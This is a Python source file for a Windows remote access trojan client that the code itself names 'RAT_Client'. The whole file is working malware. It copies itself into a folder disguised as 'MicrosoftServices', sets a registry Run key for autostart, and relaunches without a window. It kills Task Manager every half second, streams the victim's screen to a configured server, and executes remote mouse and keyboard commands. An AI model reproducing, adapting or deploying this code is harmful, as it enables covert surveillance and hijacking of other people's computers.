import json
import socket
import struct
import threading
import subprocess
import time
import sys
import os
import shutil
import winreg
from pynput.mouse import Button, Controller as MouseController
from pynput.keyboard import Controller as KeyboardController, Key
from PIL import ImageGrab
import io


def load_env():
    env = {}
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    if os.path.exists(env_path):
        try:
            with open(env_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#') or '=' not in line:
                        continue
                    key, value = line.split('=', 1)
                    env[key.strip()] = value.strip()
        except Exception:
            pass
    return env


env = load_env()
SERVER_IP = env.get('SERVER_IP', '...........') # Внешний IP-адрес вашего роутера вместо ......
PORT = int(env.get('PORT', env.get('SERVER_PORT', '......'))) # Порт сервера вместо ......
FPS = 60
JPEG_QUALITY = 60
mouse_controller = MouseController()
keyboard_controller = KeyboardController()

qt_key_map = {
    0x01000004: Key.enter,
    0x01000005: Key.escape,
    0x01000003: Key.backspace,
    0x01000006: Key.tab,
    0x01000007: Key.space,
    0x01000008: Key.page_up,
    0x01000009: Key.page_down,
    0x0100000a: Key.end,
    0x0100000b: Key.home,
    0x01000012: Key.left,
    0x01000013: Key.up,
    0x01000014: Key.right,
    0x01000015: Key.down,
    0x01000020: Key.shift,
    0x01000021: Key.ctrl,
    0x01000022: Key.alt,
    0x01000023: Key.caps_lock,
    0x01000021: Key.shift,
}


def get_persistence_path():
    documents = os.path.join(os.path.expanduser('~'), 'Documents')
    dest_dir = os.path.join(documents, 'MicrosoftServices')
    os.makedirs(dest_dir, exist_ok=True)
    return os.path.join(dest_dir, 'client.exe' if not sys.argv[0].endswith('.py') else 'client.py')


def install_persistence():
    try:
        src = os.path.abspath(sys.argv[0])
        dst = get_persistence_path()
        if os.path.normcase(src) != os.path.normcase(dst):
            try:
                shutil.copy2(src, dst)
            except Exception:
                pass

        return dst
    except Exception:
        return os.path.abspath(sys.argv[0])


def register_autostart():
    try:
        target = install_persistence()
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            if target.endswith('.py'):
                python_exe = sys.executable
                pythonw_exe = python_exe[:-10] + 'pythonw.exe' if python_exe.lower().endswith('python.exe') else python_exe
                if os.path.exists(pythonw_exe):
                    cmd = f'"{pythonw_exe}" "{target}"'
                else:
                    cmd = f'"{python_exe}" "{target}"'
            else:
                cmd = f'"{target}"'
            winreg.SetValueEx(key, "RAT_Client", 0, winreg.REG_SZ, cmd)
    except Exception:
        pass


def close_task_manager():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        creationflags = subprocess.CREATE_NO_WINDOW
        subprocess.run([
            "taskkill", "/F", "/IM", "Taskmgr.exe"
        ], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       startupinfo=startupinfo, creationflags=creationflags)
    except Exception:
        pass


def task_manager_monitor():
    while True:
        try:
            close_task_manager()
            time.sleep(0.5)
        except Exception as e:
            pass



def send_screen_data(client_socket):
    frame_time = 1.0 / FPS
    while True:
        start_time = time.time()
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='JPEG', quality=JPEG_QUALITY, optimize=True)
        frame_data = img_byte_arr.getvalue()
        packet = struct.pack('!I', len(frame_data) + 1) + b'\x01' + frame_data

        try:
            client_socket.sendall(packet)
        except Exception as e:
            break

        elapsed = time.time() - start_time
        sleep_time = frame_time - elapsed
        if sleep_time > 0:
            time.sleep(sleep_time)


def recv_all(sock, length):
    data = b""
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data


def handle_command(command):
    cmd = command.get('cmd')
    if cmd == 'move':
        x = command.get('x')
        y = command.get('y')
        if x is not None and y is not None:
            try:
                mouse_controller.position = (x, y)
            except Exception:
                pass
    elif cmd == 'button':
        button_name = command.get('button')
        action = command.get('action')
        button = None
        if button_name == 'left':
            button = Button.left
        elif button_name == 'right':
            button = Button.right
        elif button_name == 'middle':
            button = Button.middle
        if button is None:
            return
        try:
            if action == 'press':
                mouse_controller.press(button)
            elif action == 'release':
                mouse_controller.release(button)
        except Exception:
            pass
    elif cmd == 'key':
        key_value = command.get('key', '')
        key_code = command.get('key_code')
        key_obj = None
        if key_value:
            key_obj = key_value
        elif key_code in qt_key_map:
            key_obj = qt_key_map[key_code]
        if key_obj is None:
            return
        action = command.get('action')
        try:
            if action == 'press':
                keyboard_controller.press(key_obj)
            elif action == 'release':
                keyboard_controller.release(key_obj)
        except Exception:
            pass


def command_loop(client_socket):
    try:
        while True:
            header = recv_all(client_socket, 4)
            if not header:
                break
            frame_length = struct.unpack('!I', header)[0]
            if frame_length <= 0:
                break

            payload = recv_all(client_socket, frame_length)
            if not payload:
                break

            payload_type = payload[0]
            if payload_type != 2:
                continue

            try:
                command = json.loads(payload[1:].decode('utf-8'))
                handle_command(command)
            except Exception as e:
                pass
    except Exception as e:
        pass




def ensure_hidden_start():
    if sys.argv[0].endswith('.py') and sys.executable.lower().endswith('python.exe'):
        pythonw_exe = sys.executable[:-10] + 'pythonw.exe'
        target = os.path.abspath(sys.argv[0])
        if os.path.exists(pythonw_exe):
            try:
                subprocess.Popen([
                    pythonw_exe,
                    target
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
            except Exception:
                pass


def start_client():
    register_autostart()
    ensure_hidden_start()

    threading.Thread(target=task_manager_monitor, daemon=True).start()

    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((SERVER_IP, PORT))
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            print(f"Connected to server: {SERVER_IP}:{PORT}")

            send_thread = threading.Thread(target=send_screen_data, args=(client_socket,), daemon=True)
            send_thread.start()
            command_thread = threading.Thread(target=command_loop, args=(client_socket,), daemon=True)
            command_thread.start()

            command_thread.join()
        except Exception:
            time.sleep(2)
        finally:
            try:
                client_socket.close()
            except Exception:
                pass

        time.sleep(1)


if __name__ == "__main__":
    start_client()
